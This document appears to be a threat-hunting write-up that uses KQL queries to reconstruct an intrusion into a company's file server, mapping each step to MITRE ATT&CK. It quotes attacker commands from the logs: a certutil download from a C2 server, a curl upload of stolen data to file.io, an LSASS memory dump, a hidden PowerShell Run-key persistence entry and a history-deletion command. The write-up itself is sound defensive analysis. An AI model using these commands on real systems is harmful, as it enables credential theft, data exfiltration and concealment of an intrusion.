# Azuki Import/Export — 梓貿易株式会社

> **Status:** 🔴 Active Incident

---

## 📋 Incident Brief

### Situation

After establishing initial access on **November 19th**, network monitoring detected
the attacker returning approximately **72 hours later**. Suspicious lateral movement
and large data transfers were observed overnight on the file server.

---

| Field | Detail |
|---|---|
| **Initial Access** | November 19th |
| **Return Interval** | ~72 hours |
| **Activity Observed** | Lateral movement |
| **Target** | File server |
| **Timing** | Overnight |

---
<br><br><br>
# Query 1: Initial Access — Return Connection Source

A KQL query was executed against `DeviceLogonEvents` for the November 21–23, 2025
timeframe, targeting the compromised host `azuki-sl`. The query filtered for
`LogonSuccess` events where `AccountDomain` matched the device name, excluding
`system`-initiated processes to isolate attacker-driven authentication activity.
Results were projected to surface `RemoteDeviceName`, `RemoteIP`, and `RemotePort`
to identify the external machine and address used to re-establish access. The goal
was to confirm the source of the attacker's return connection approximately 72 hours
after initial access on November 19th.

---

## Key Findings

The results confirm **two successful logon events** from a **single remote IP address**
on **November 22, 2025**, both originating from `159.26.106.98`:

1. `12:27:53 AM UTC` — logon from remote device named **`kali`**
2. `1:58:55 AM UTC` — logon from remote device named **`sanc-main`**

Both sessions arrived on the same source IP within approximately **90 minutes of each
other**, confirming a deliberate and staged reconnection by the same actor.

<img width="1171" height="405" alt="image" src="https://github.com/user-attachments/assets/bb6dc7bd-8f62-4c8d-b8f0-d87582d60255" />

**MITRE ATT&CK:** `T1078` — Valid Accounts  
**MITRE ATT&CK:** `T1021.001` — Remote Services: Remote Desktop Protocol

---
<br><br><br>
# Query 2: Lateral Movement — Compromised Device

A KQL query was executed against `DeviceNetworkEvents` for the November 21–23, 2025
timeframe, filtering for a known suspicious internal IP address `10.1.0.188` observed
during lateral movement activity. The query filtered on `LocalIP` and projected
`DeviceName` to resolve the internal IP to a hostname. The goal was to identify which
device on the internal network was associated with the suspicious IP, establishing it
as a target or pivot point in the attacker's lateral movement chain.

---

## Key Findings

The query resolves `10.1.0.188` to a **single device**:

- `10.1.0.188` maps to **`azuki-fileserver01`**

This confirms the device involved in the lateral movement activity is the **primary
file server** on the Azuki network — a high-value target consistent with the large
data transfers observed overnight during the intrusion window.

<img width="1236" height="320" alt="image" src="https://github.com/user-attachments/assets/43a328c4-665d-4f6b-98bc-8c23b09f0b28" />

---

## What This Reveals

**`azuki-fileserver01`** — the hostname behind the suspicious internal IP. File servers
are a primary objective in data theft operations due to their centralised storage of
business documents, credentials, and sensitive data. The attacker's pivot to this device
suggests deliberate targeting of stored assets rather than opportunistic movement.

**Internal IP `10.1.0.188`** — a RFC 1918 private address, confirming this activity
occurred entirely within the internal network segment. The attacker had already
established a foothold on `azuki-sl` and moved laterally to reach this device without
needing to re-enter from an external address.

**Pivot methodology** — resolving an IP to a `DeviceName` via `DeviceNetworkEvents`
is a critical step when logon telemetry references internal IPs rather than hostnames.
This lookup bridges the gap between network-layer observations and endpoint-level
forensic queries, enabling all subsequent investigation of `azuki-fileserver01` across
`DeviceLogonEvents`, `DeviceFileEvents`, and `DeviceProcessEvents`.

**MITRE ATT&CK:** `T1021.002` — Remote Services: SMB/Windows Admin Shares  
**MITRE ATT&CK:** `T1083` — File and Directory Discovery

---
<br><br><br>
# Query 3: Lateral Movement — Compromised Account on File Server

A KQL query was executed against `DeviceLogonEvents` for the November 21–23, 2025
timeframe, targeting `azuki-fileserver01` — the internal file server identified in
the previous query. The query filtered for `LogonSuccess` events originating from
internal IP `10.1.0.204`, projecting `AccountDomain`, `AccountName`, `ActionType`,
`DeviceName`, and `RemoteIP`, sorted ascending by `TimeGenerated` to establish
chronological order. The goal was to identify which account was used to authenticate
to the file server from the attacker's internal pivot point, confirming lateral
movement and the credential leveraged to access the device.

---

## Key Findings

The query returns **a single logon event** on **November 22, 2025**:

- `12:38:49 AM UTC` — successful logon to `azuki-fileserver01` using account **`fileadmin`**
- Originating from internal IP **`10.1.0.204`**
- Under domain **`azuki-fileserve`**

A single clean logon event with no failed attempts preceding it strongly suggests
the attacker already held valid credentials for `fileadmin` before attempting access —
likely obtained during the credential harvesting phase on `azuki-sl`.

<img width="1339" height="360" alt="image" src="https://github.com/user-attachments/assets/ae59c451-dd08-48b0-b078-186f0535fa6d" />

---

## What This Reveals

**Account `fileadmin`** — the compromised credential used to authenticate to the file
server. The name strongly implies this is a dedicated service or administrative account
scoped to file server operations, making it a high-privilege target. Possession of this
account would grant the attacker broad read and write access to shared drives and stored
data across `azuki-fileserver01`.

**No failed logon attempts** — the absence of preceding `LogonFailed` events indicates
the attacker did not brute-force this credential. `fileadmin` was likely extracted from
`azuki-sl` during the Mimikatz credential dumping activity observed earlier in the
intrusion, then used directly and successfully on first attempt.

**Source IP `10.1.0.204`** — an internal address, confirming the attacker moved
laterally from within the network rather than re-entering externally. This IP represents
the machine the attacker was operating from at the time of the file server logon,
likely `azuki-sl` or another already-compromised internal host.

**Domain `azuki-fileserve`** — the truncated domain name is consistent with a local
machine account rather than a domain account, suggesting `fileadmin` is a local
administrator account on `azuki-fileserver01` itself. Local admin accounts of this
type are frequently targeted because they are often shared across devices with identical
credentials and are not subject to domain-level account monitoring policies.

**MITRE ATT&CK:** `T1078.003` — Valid Accounts: Local Accounts  
**MITRE ATT&CK:** `T1550.002` — Use Alternate Authentication Material: Pass the Hash

---
<br><br><br>
# Query 5: Discovery — Network Share Enumeration

A KQL query was executed against `DeviceProcessEvents` scoped to `azuki-fileserver01`
under the compromised account `fileadmin`, filtered to the window beginning at the
confirmed logon time of `12:38 AM UTC on November 22, 2025`. The query filtered
`ProcessCommandLine` for the string `share` and projected `FileName` and
`ProcessCommandLine`, sorted ascending by `TimeGenerated`. The goal was to identify
whether the attacker enumerated local network shares on the file server following
lateral movement, confirming the discovery phase of the intrusion.

---

## Key Findings

The results confirm **one share enumeration command** was executed on
`azuki-fileserver01` under `fileadmin` at **`12:40:54 AM UTC on November 22, 2025`**
— approximately **two minutes after the attacker's logon** at `12:38:49 AM UTC:

1. `12:40:54 AM UTC` — `"net.exe" share` executed directly under `fileadmin`

The two-minute gap between logon and share enumeration is consistent with an attacker
performing rapid manual reconnaissance immediately after gaining interactive access to
the file server.

<img width="790" height="270" alt="image" src="https://github.com/user-attachments/assets/f0dc81b6-ee88-42b9-bfce-74e488719607" />

---

## What This Reveals

**`net.exe share`** — the native Windows command for listing all shared folders hosted
on the local machine. Executing this immediately after logon is a textbook discovery
action — the attacker was mapping what data repositories were available on
`azuki-fileserver01` before deciding what to target for collection. 

**MITRE ATT&CK:** `T1135` — Network Share Discovery  
**MITRE ATT&CK:** `T1078.003` — Valid Accounts: Local Accounts

---
<br><br><br>
# Query 6: Discovery — Privilege Enumeration

A KQL query was executed against `DeviceProcessEvents` scoped to `azuki-fileserver01`
under the compromised account `fileadmin`, filtered to the window beginning at the
confirmed logon time of `12:38 AM UTC on November 22, 2025`. The query filtered
`ProcessCommandLine` for the strings `whoami`, `privilege`, and `groups` to identify
any account and privilege enumeration activity performed by the attacker following
lateral movement onto the file server.

---

## Key Findings

The results confirm **one privilege enumeration command** was executed on
`azuki-fileserver01` under `fileadmin` at **`12:42:24 AM UTC on November 22, 2025`**
— approximately **four minutes after the attacker's logon** at `12:38:49 AM UTC`:

1. `12:42:24 AM UTC` — `"whoami.exe" /all` executed under `fileadmin`

<img width="778" height="240" alt="image" src="https://github.com/user-attachments/assets/fd33b297-c651-4a33-adf5-8071b640b53c" />

---

## What This Reveals

**`whoami /all`** — the most comprehensive privilege enumeration command available
natively on Windows. The `/all` flag returns the full token information for the current
user including username, SID, group memberships, privileges, and logon attributes.
Running this immediately after lateral movement is standard attacker behaviour —
confirming what level of access the compromised credential actually carries on the
new machine before proceeding with collection or persistence actions.

**Execution at `12:42 AM`** — this places privilege enumeration as the third action
taken by the attacker on `azuki-fileserver01`, following the RDP logon at `12:38 AM`
and share enumeration via `net share` at `12:40 AM`. The consistent two-minute
cadence between actions reinforces the pattern of a scripted or methodical intrusion
sequence rather than opportunistic manu

**MITRE ATT&CK:** `T1033` — System Owner/User Discovery  
**MITRE ATT&CK:** `T1069.001` — Permission Groups Discovery: Local Groups

---
<br><br><br>
# Query 7: Discovery — Network Configuration Enumeration

A KQL query was executed against `DeviceProcessEvents` scoped to `azuki-fileserver01`
under the compromised account `fileadmin`, filtered to the window beginning at the
confirmed logon time of `12:38 AM UTC on November 22, 2025`. The query filtered
`ProcessCommandLine` for `ipconfig` to identify any network configuration enumeration
performed by the attacker following lateral movement onto the file server.

---

## Key Findings

The results confirm **one network configuration command** was executed on
`azuki-fileserver01` under `fileadmin` at **`12:42:46 AM UTC on November 22, 2025`**
— approximately **four minutes after the attacker's logon** at `12:38:49 AM UTC`:

1. `12:42:46 AM UTC` — `"ipconfig.exe" /all` executed under `fileadmin`

<img width="782" height="242" alt="image" src="https://github.com/user-attachments/assets/e3ed0170-0fb9-4dc0-a36f-542127d40330" />


---

## What This Reveals

**`ipconfig /all`** — the most detailed network configuration command available
natively on Windows. The `/all` flag returns full adapter information including IP
addresses, subnet masks, default gateway, DNS servers, DHCP configuration, MAC
addresses, and hostname. Running this immediately after lateral movement is standard
attacker behaviour — mapping the network topology of the newly compromised host to
identify additional targets, routing paths, and exfiltration options.

**Execution at `12:42:46 AM`** — this places network enumeration as the fourth
sequential action taken by the attacker on `azuki-fileserver01`, executed just
**22 seconds after** `whoami /all` at `12:42:24 AM`. The tight sequencing of
`whoami /all` followed immediately by `ipconfig /all` is a well-known attacker
pattern — confirming account privileges then confirming network position in rapid
succession as part of a structured post-exploitation checklist.

**What the attacker learned** — the output of `ipconfig /all` on `azuki-fileserver01`
would have confirmed the device's internal IP address of `10.1.0.188`, its subnet,
DNS configuration, and any additional network interfaces. This information directly
supports the subsequent C2 beacon activity observed from the same device — the
`curl.exe` calls to `78.141.196.6:8880` include `ip=10.1.0.188` in the beacon
parameters, confirming the attacker used the `ipconfig` output to populate their
implant's host fingerprint before establishing the C2 channel.

**MITRE ATT&CK:** `T1016` — System Network Configuration Discovery  
**MITRE ATT&CK:** `T1016.001` — System Network Configuration Discovery: Internet
Connection Discovery

---
<br><br><br>
# Query 8: Defense Evasion — Directory Hiding

A KQL query was executed against `DeviceProcessEvents` scoped to `azuki-fileserver01`,
filtered to the window beginning at the confirmed logon time of `12:38 AM UTC on
November 22, 2025`. The query filtered `ProcessCommandLine` for `attrib.exe` to
identify any file or directory attribute manipulation performed by the attacker as
part of their defense evasion routine on the file server.

---

## Key Findings

The results confirm **one directory hiding command** was executed on
`azuki-fileserver01` at **`12:55:43 AM UTC on November 22, 2025`** — approximately
**17 minutes after the attacker's logon** at `12:38:49 AM UTC`:

1. `12:55:43 AM UTC` — `"attrib.exe" +h +s C:\Windows\Logs\CBS`

<img width="766" height="240" alt="image" src="https://github.com/user-attachments/assets/e78516b9-ecb0-4d16-a3f3-b0ae12c1d32f" />


---

## What This Reveals

**`attrib +h +s`** — a native Windows command that sets two file system attributes
simultaneously on the target path:
- `+h` — marks the directory as **hidden**, removing it from standard Explorer and
  `dir` listings
- `+s` — marks the directory as a **system directory**, granting it additional
  protection and further concealing it from casual inspection

Together these flags make `C:\Windows\Logs\CBS` invisible to standard directory
browsing and most automated file enumeration tools, while the directory and its
contents remain fully accessible to the attacker.

**Target path `C:\Windows\Logs\CBS`** — this is the exact staging directory the
attacker created earlier using `xcopy.exe` to copy the contents of the file server
shares. By the time this command was executed, the directory already contained staged
copies of `Contracts`, `Financial`, `IT-Admin`, and `Shipping` share data. Hiding
the directory after staging confirms the attacker was deliberately concealing the
collected data from defenders and automated monitoring tools while preparing for
exfiltration.

**Execution timing** — this command was executed 15 minutes after the `xcopy` staging
operations completed, placing it clearly within the post-collection, pre-exfiltration
phase of the intrusion. The attacker staged the data, verified the staging directory
contained the expected files, then hid it before activating the C2 channel for
exfiltration.

**Legitimate cover** — `C:\Windows\Logs\CBS` is a real Windows directory used by the
Component Based Servicing engine for update logs. Using it as a staging path was a
deliberate choice to blend in with legitimate system activity — a location that would
appear unremarkable in a directory listing even if the hidden attribute were somehow
bypassed.

**MITRE ATT&CK:** `T1564.001` — Hide Artifacts: Hidden Files and Directories  
**MITRE ATT&CK:** `T1074.001` — Data Staged: Local Data Staging

---
<br><br><br>
# Query 9: Defense Evasion — Malicious Script Download

A KQL query was executed against `DeviceProcessEvents` scoped to `azuki-fileserver01`,
filtered to the window beginning at the confirmed logon time of `12:38 AM UTC on
November 22, 2025`. The query filtered for processes where `InitiatingProcessCommandLine`
contained `powershell.exe` and `ProcessCommandLine` contained `.ps1`, to identify
any scripts downloaded or executed under PowerShell during the intrusion window.
Results were sorted ascending by `TimeGenerated` to establish execution order.

---

## Key Findings

The results confirm **one script download command** was executed on
`azuki-fileserver01` at **`12:56:47 AM UTC on November 22, 2025`** — approximately
**18 minutes after the attacker's logon** at `12:38:49 AM UTC`:

1. `12:56:47 AM UTC` — `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`

<img width="686" height="218" alt="image" src="https://github.com/user-attachments/assets/3b6ea8c1-e8df-47cc-bd42-3609e7fc046f" />


---

## What This Reveals

**`certutil -urlcache -f`** — a native Windows certificate utility that has been
widely abused as a file downloader. The `-urlcache` flag accesses the URL cache
and `-f` forces a fresh download, effectively turning `certutil.exe` into a
fully functional HTTP file downloader without requiring PowerShell's
`Invoke-WebRequest` or any third-party tooling. This technique is a well-known
living-off-the-land method specifically chosen to avoid triggering detections that
monitor PowerShell download cradles.

**Source `http://78.141.196.6:7331/ex.ps1`** — the file was downloaded directly
from the attacker's C2 server at `78.141.196.6`, the same IP observed throughout
the intrusion in the `curl.exe` beacon activity. The port `7331` differs from the
C2 beacon port `8880`, indicating the attacker operates a multi-port C2 server —
`8880` for beacon and tasking traffic, `7331` as a file delivery endpoint.

**Destination `C:\Windows\Logs\CBS\ex.ps1`** — the script was written directly
into the staging directory already used to store the copied file share data and
already marked hidden and system via `attrib +h +s`. Placing the script inside
this directory keeps all attacker tooling consolidated in a single concealed
location and ensures `ex.ps1` inherits the hidden and system attributes applied
to the parent directory.

**Script name `ex.ps1`** — the filename strongly suggests an exfiltration script.
Given that the staging directory already contains copies of `Contracts`,
`Financial`, `IT-Admin`, and `Shipping` share data, this script is very likely
the mechanism the attacker deployed to transfer the staged data out of the
environment to the C2 server — completing the collection-to-exfiltration chain.

**MITRE ATT&CK:** `T1105` — Ingress Tool Transfer  
**MITRE ATT&CK:** `T1140` — Deobfuscate/Decode Files or Information  
**MITRE ATT&CK:** `T1059.001` — Command and Scripting Interpreter: PowerShell

---
<br><br><br>
# Query 10: Collection — Credential File Discovery

A KQL query was executed against `DeviceFileEvents` scoped to `azuki-fileserver01`,
filtered to the window beginning at the confirmed logon time of `12:38 AM UTC on
November 22, 2025`. The query filtered for `FileCreated` actions excluding
system-initiated processes, and narrowed results to files ending with `.csv` to
identify any credential or sensitive data files created during the intrusion window.
The goal was to determine whether the attacker created or accessed structured data
files containing credentials or sensitive account information during the collection
phase.

---

## Key Findings

The results confirm **one credential file was created** on `azuki-fileserver01` at
**`1:07:53 AM UTC on November 22, 2025`** — approximately **29 minutes after the
attacker's logon** at `12:38:49 AM UTC`:

1. `1:07:53 AM UTC` — `IT-Admin-Passwords.csv` created on `azuki-fileserver01`

<img width="1142" height="290" alt="image" src="https://github.com/user-attachments/assets/bafcbbfa-1457-425a-ba52-c9d8f89ed433" />

---

## What This Reveals

**`IT-Admin-Passwords.csv`** — the filename is unambiguous. This is a credential
file containing IT administrator passwords stored in CSV format. Its creation during
the active intrusion window under a non-system process confirms the attacker either
generated this file by dumping credentials from a local store, exported it from a
password manager or secrets vault accessible via the `IT-Admin` share, or compiled
it from credentials discovered during the post-exploitation phase. A file of this
name in an attacker-controlled session represents one of the most significant finds
of the intrusion — a structured credential repository that could enable further
lateral movement across the entire Azuki network.

**Timing relative to `xcopy` staging** — this file was created at `1:07:53 AM`,
placing it directly within the `xcopy` staging window. The `IT-Admin` share was
copied to `C:\Windows\Logs\CBS\it-admin` at `1:07:53 AM UTC` — the exact same
timestamp. This confirms `IT-Admin-Passwords.csv` was sourced directly from the
`IT-Admin` file share and copied into the staging directory as part of the bulk
data collection operation, rather than being independently generated by the attacker.

**Scope of exposure** — IT administrator password files represent a complete
compromise of privileged access across any system those credentials cover. If the
`IT-Admin` share contained credentials for domain controllers, network infrastructure,
or other servers beyond `azuki-fileserver01`, the attacker now holds the keys to
expand the intrusion significantly beyond what has been observed so far.

**`FileType: Unknown`** — the `AdditionalFields` value of `FileType: Unknown`
indicates the `.csv` extension was not associated with a registered application at
the time of creation, which is consistent with a file created programmatically
rather than through a standard application — further supporting the conclusion that
this file was produced by attacker tooling or a script rather than a legitimate
user action.

**MITRE ATT&CK:** `T1552.001` — Unsecured Credentials: Credentials in Files  
**MITRE ATT&CK:** `T1005` — Data from Local System

---
<br><br><br>
# Query 11: Collection — Data Staging & Exfiltration Preparation

A series of KQL queries were executed against `DeviceProcessEvents` and
`DeviceNetworkEvents` scoped to `azuki-fileserver01` under the compromised account
`fileadmin`, covering the window from `12:38 AM` to `3:00 AM UTC on November 22,
2025`. The goal was to map the complete data collection chain from initial staging
through to exfiltration preparation.

---

## Key Findings

The attacker executed a sequential collection pipeline:

1. `1:05 AM` — `xcopy` staging begins — four shares copied recursively
2. `1:20 AM` — staging complete — directory hidden via `attrib +h +s`
3. Post-staging — `lsass.dmp` created, archive compressed, exfiltration attempted

<img width="720" height="454" alt="image" src="https://github.com/user-attachments/assets/b191ed46-ae99-42e4-b580-b03c2e459fc6" />


---

## Recursive Copy — `xcopy.exe`

The attacker used native `xcopy.exe` to copy all four file shares into the hidden
staging directory `C:\Windows\Logs\CBS\` in the following order:

| Time | Source | Destination |
|---|---|---|
| `1:05 AM` | `C:\FileShares\Contracts` | `CBS\contracts` |
| `1:06 AM` | `C:\FileShares\Financial` | `CBS\financial` |
| `1:07 AM` | `C:\FileShares\IT-Admin` | `CBS\it-admin` |
| `1:20 AM` | `C:\FileShares\Shipping` | `CBS\shipping` |

All commands used `/E /I /H /Y` — recursively copying all subdirectories including
hidden and system files without prompting. `xcopy` was chosen specifically because
it is a native Windows binary, unlikely to trigger security alerts.

---

## Compression — `tar.exe`

Following staging, the attacker used native `tar.exe` to compress the contents of
`C:\Windows\Logs\CBS\` into a single archive, bundling all four share copies and
`lsass.dmp` into one file for exfiltration. Using the built-in Windows `tar.exe`
avoids the need to download third-party compression tools such as 7-Zip or WinRAR.

---

## Renamed Tool — `pd.exe` (Procdump)

The attacker executed:

```
"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
```

`pd.exe` is a renamed `procdump.exe` — a legitimate Sysinternals tool — used to
dump the full memory of `lsass.exe` (process ID `876`). The dump was written
directly into the staging directory. Renaming the binary from `procdump.exe` to
`pd.exe` is a deliberate masquerading technique to bypass detections that alert on
the Sysinternals tool by filename. The resulting `lsass.dmp` contains all
credentials, NTLM hashes, and Kerberos tickets cached on `azuki-fileserver01`.

---

## Cloud Exfiltration — `file.io`

Rather than exfiltrating exclusively through the known C2 channel at
`78.141.196.6:8880`, the attacker used `file.io` — a legitimate temporary file
sharing service — as an alternative exfiltration endpoint:

```
curl -F "file=@C:\Windows\Logs\CBS\<archive>" https://file.io
```

`file.io` provides one-time download links that self-destruct after a single
retrieval, destroying upload evidence. Using a trusted public service bypasses
firewall rules that block known malicious IPs and makes the traffic appear as
legitimate HTTPS web activity.

---

## MITRE ATT&CK

- `T1119` — Automated Collection
- `T1074.001` — Data Staged: Local Data Staging
- `T1003.001` — OS Credential Dumping: LSASS Memory
- `T1036.003` — Masquerading: Rename System Utilities
- `T1567.002` — Exfiltration to Cloud Storage
- `T1560.001` — Archive Collected Data: Archive via Utility

---
<br><br><br>
# Query 12: Persistence — Registry Run Key

A KQL query was executed against `DeviceRegistryEvents` scoped to `azuki-fileserver01`
under the compromised account `fileadmin`, filtered to the window beginning at
`12:38 AM UTC on November 22, 2025`. The query projected `TimeGenerated`,
`ActionType`, `InitiatingProcessCommandLine`, and `RegistryValueName` to identify
any registry modifications made by the attacker to establish persistence on the file
server.

---

## Key Findings

The results confirm **one registry persistence key was created** on
`azuki-fileserver01` at **`2:10:50 AM UTC on November 22, 2025`** — approximately
**92 minutes after the attacker's logon** at `12:38:49 AM UTC`:

1. `2:10:50 AM UTC` — `RegistryValueSet` action under `fileadmin`
   - **Key:** `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
   - **Value name:** `FileShareSync`
   - **Data:** `powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1`

<img width="1396" height="316" alt="image" src="https://github.com/user-attachments/assets/273cb15e-0e90-4b97-8562-3880ccf76524" />


---

## What This Reveals

**`HKLM\...\CurrentVersion\Run`** — one of the most commonly abused registry
locations for persistence. Any value set here executes automatically at system
startup for all users. Writing to `HKLM` rather than `HKCU` requires administrator
privileges, confirming `fileadmin` held local administrator rights on
`azuki-fileserver01`.

**Value name `FileShareSync`** — deliberately named to appear as a legitimate file
synchronisation service, blending in with expected enterprise software entries in
the Run key and reducing the likelihood of manual detection during routine
administration.

**Payload `powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1`** —
breaking down the flags:
- `-NoP` — no profile, bypasses PowerShell profile-based detections
- `-W Hidden` — runs the window hidden, no visible terminal appears on screen
- `-File C:\Windows\System32\svchost.ps1` — executes a script named after the
  legitimate `svchost.exe` Windows process, stored in `System32` to masquerade
  as a native system file

**`svchost.ps1` in `System32`** — placing a malicious PowerShell script in
`C:\Windows\System32\` and naming it after one of the most common Windows processes
is a deliberate masquerading technique. Casual inspection of running processes or
startup entries would suggest a legitimate system component rather than attacker
tooling.

**Timing relative to collection** — this persistence mechanism was installed at
`2:10 AM`, after all four file share staging operations completed and after the
C2 beacon loop via `curl.exe` was already active. This confirms the attacker
secured long-term access to `azuki-fileserver01` after completing the primary
collection objective, ensuring they could return to the device even if the active
RDP session was terminated or credentials were rotated.

**MITRE ATT&CK:** `T1547.001` — Boot or Logon Autostart Execution: Registry Run Keys
**MITRE ATT&CK:** `T1059.001` — Command and Scripting Interpreter: PowerShell
**MITRE ATT&CK:** `T1036.005` — Masquerading: Match Legitimate Name or Location

---
<br><br><br>
# Query 13: Anti-Forensics — History File Deletion

A KQL query was executed against `DeviceFileEvents` scoped to `azuki-fileserver01`,
filtered to the window beginning at `12:38 AM UTC on November 22, 2025`. The query
filtered for `FileDeleted` action types and projected `TimeGenerated`, `ActionType`,
`FileName`, `FolderPath`, and `InitiatingProcessCommandLine` to identify any
deliberate file deletion activity performed by the attacker as part of their
anti-forensics cleanup routine.

---

## Key Findings

The results confirm **one history file was deleted** on `azuki-fileserver01` at
**`2:26:01 AM UTC on November 22, 2025`** — approximately **108 minutes after the
attacker's logon** at `12:38:49 AM UTC`:

1. `2:26:01 AM UTC` — `ConsoleHost_history.txt` deleted by `powershell.exe`
   - **File:** `ConsoleHost_history.txt`
   - **Path:** `C:\Users\fileadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
   - **Initiating process:** `powershell.exe`

<img width="1438" height="221" alt="image" src="https://github.com/user-attachments/assets/8ca3e11b-e8ec-4ced-967b-6aec221e7511" />


---

## What This Reveals

**`ConsoleHost_history.txt`** — this is the **PowerShell command history file**.
Every command typed interactively in a PowerShell session is automatically saved
to this file by the PSReadLine module. It is the PowerShell equivalent of `.bash_history`
on Linux — a complete record of every command the attacker typed during their
interactive session on `azuki-fileserver01`.

**What was destroyed** — the deleted history file would have contained a full
record of every PowerShell command executed by the attacker under `fileadmin`
during the intrusion, including commands used to:
- Enumerate shares and network configuration
- Stage data via `xcopy`
- Download `ex.ps1` via `certutil`
- Establish the registry persistence key
- Interact with the C2 infrastructure

**Initiating process `powershell.exe`** — the deletion was executed from within
a PowerShell session, confirming the attacker ran a cleanup command directly
before terminating their session. A common method is:

```powershell
Remove-Item (Get-PSReadLineOption).HistorySavePath
```

**Timing** — this deletion occurred at `2:26 AM`, after the registry persistence
key was set at `2:10 AM` and after the C2 beacon loop was active. This places
history deletion as one of the final cleanup actions before the attacker concluded
their session, consistent with a structured anti-forensics routine performed in
the intrusion's closing phase.

**Investigative impact** — while the file was deleted, `DeviceFileEvents` telemetry
captured the deletion event itself, preserving the forensic record that the cleanup
occurred. The attacker removed the history file but could not remove the MDE log
showing it was deleted — a common blind spot in attacker anti-forensics planning.

**MITRE ATT&CK:** `T1070.003` — Indicator Removal: Clear Command History
**MITRE ATT&CK:** `T1059.001` — Command and Scripting Interpreter: PowerShell


